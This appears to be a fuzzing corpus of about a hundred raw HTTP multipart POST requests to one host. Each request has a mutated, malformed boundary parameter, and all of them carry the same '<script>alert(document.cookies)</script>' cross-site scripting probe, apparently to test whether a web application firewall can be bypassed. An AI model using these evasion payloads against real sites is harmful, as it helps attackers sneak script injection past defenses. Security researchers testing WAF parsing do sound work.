POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 439\r\nContent-Type: multipart/form-data; bounyry=b\x7fnMdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 503\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 567\r\nContent-Type: multipart/form-data; boun;ary=bondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 631\r\nContent-Type: multipart/form-data; boundarybounary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 695\r\nContent-Type: multipart/form-data; =boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 759\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 823\r\nContent-Type: multipart/form-data; boYn}dary=!onun\x19dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 887\r\nContent-Type: multipart/form-data; b?xu\x19daryb\xc2\xbbundarE;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 951\r\nContent-Type: multipart/form-data; ==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 46\r\nContent-Type: multipart/form-data; boudary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 110\r\nContent-Type: multipart/form-data; boundaryboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 174\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 238\r\nContent-Type: multipart/form-data; bou5nda%y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 302\r\nContent-Type: multipart/form-data; bTundar%y==nouda\xc2\xabr0y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 366\r\nContent-Type: multipart/form-data; b\x12oundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 430\r\nContent-Type: multipart/form-data; boundarybo\x1bndaryblondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 494\r\nContent-Type: multipart/form-data; b{u4d0y=bun^arybo\x02und#r:;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 558\r\nContent-Type: multipart/form-data; ouddary=boundar\x05boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 622\r\nContent-Type: multipart/form-data; boundaryboundaery=boundarybondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 686\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 750\r\nContent-Type: multipart/form-data; \routary=boundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 814\r\nContent-Type: multipart/form-data; =%bondl^yboundar\n=Poundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 878\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 942\r\nContent-Type: multipart/form-data; boundaDry=boundaryibou+ndar^;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 58\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 122\r\nContent-Type: multipart/form-data; bo\rndaryboundaryboundar\ty;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 186\r\nContent-Type: multipart/form-data; \x19bounda\x11y=boundr\x7f;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 250\r\nContent-Type: multipart/form-data; ==bVondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 314\r\nContent-Type: multipart/form-data; oun\x07ary=bou3dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 378\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 442\r\nContent-Type: multipart/form-data; bnuda4ybouudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 506\r\nContent-Type: multipart/form-data; bo\x03undaqy=bLundar\x12=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 570\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 634\r\nContent-Type: multipart/form-data; bolndary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 698\r\nContent-Type: multipart/form-data; bound\x15\x10=boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 762\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 826\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 890\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 954\r\nContent-Type: multipart/form-data; boundary=bondavry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 11\r\nContent-Type: multipart/form-data; =joundarS9;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 75\r\nContent-Type: multipart/form-data; bounWdry=]und4arty;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 139\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 203\r\nContent-Type: multipart/form-data; boundary=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 267\r\nContent-Type: multipart/form-data; boundaryboudaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 331\r\nContent-Type: multipart/form-data; boundfabr=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 395\r\nContent-Type: multipart/form-data; bon\x10Iaryboundaryb/undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 459\r\nContent-Type: multipart/form-data; boundar\x0by=?ou:P\x18r;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 523\r\nContent-Type: multipart/form-data; b\x04oundrWboundary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 587\r\nContent-Type: multipart/form-data; boAunday=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 651\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 715\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 779\r\nContent-Type: multipart/form-data; =boGudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 843\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 907\r\nContent-Type: multipart/form-data; b\x10oundary====;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 971\r\nContent-Type: multipart/form-data; boundaryoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 49\r\nContent-Type: multipart/form-data; b)undary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 113\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 177\r\nContent-Type: multipart/form-data; bouZary=bioundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 241\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 305\r\nContent-Type: multipart/form-data; boundary=bo\x17unBary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 369\r\nContent-Type: multipart/form-data; bouNn\x00ary==boundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 433\r\nContent-Type: multipart/form-data; bBoundary=\xc2\xbbondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 497\r\nContent-Type: multipart/form-data; bundaryboundary=bo*unda$ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 561\r\nContent-Type: multipart/form-data; b6undaryboun\x0fdarGyboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 625\r\nContent-Type: multipart/form-data; boundaryboundaOb[undary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 689\r\nContent-Type: multipart/form-data; bu+n\x14daryboundary=boundarybou\x0bary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 753\r\nContent-Type: multipart/form-data; oundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 817\r\nContent-Type: multipart/form-data; boun!ary=boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 881\r\nContent-Type: multipart/form-data; =bo\x04E\x00d*a=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 945\r\nContent-Type: multipart/form-data; =bound\x0cr-;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 1\r\nContent-Type: multipart/form-data; boundarSy=b oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 65\r\nContent-Type: multipart/form-data;  ousFaryboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 129\r\nContent-Type: multipart/form-data; b\x7foundarybuday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 193\r\nContent-Type: multipart/form-data; boundaryboundaryboud\x1dadwy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 257\r\nContent-Type: multipart/form-data; boundaryboudary=boundarty;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 321\r\nContent-Type: multipart/form-data; bwound:r==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 385\r\nContent-Type: multipart/form-data; boun\x02ary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 449\r\nContent-Type: multipart/form-data; boundaryboundaryb\x1eundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 513\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 577\r\nContent-Type: multipart/form-data; bound;ary===bou&T=ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 641\r\nContent-Type: multipart/form-data; oundary==0oundHy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 705\r\nContent-Type: multipart/form-data; bounday=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 769\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 833\r\nContent-Type: multipart/form-data; =oMndar===bmondari;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 897\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 961\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 34\r\nContent-Type: multipart/form-data; b6`sdar==boun%dawry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 98\r\nContent-Type: multipart/form-data; bun\x04dary==cbound5ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 162\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 226\r\nContent-Type: multipart/form-data; boundar3i=\x16ound_Gy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 290\r\nContent-Type: multipart/form-data; bounda,rybo/ncary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 354\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 418\r\nContent-Type: multipart/form-data; b\x00onQaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 482\r\nContent-Type: multipart/form-data; boundy=bou7\x16day;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 546\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
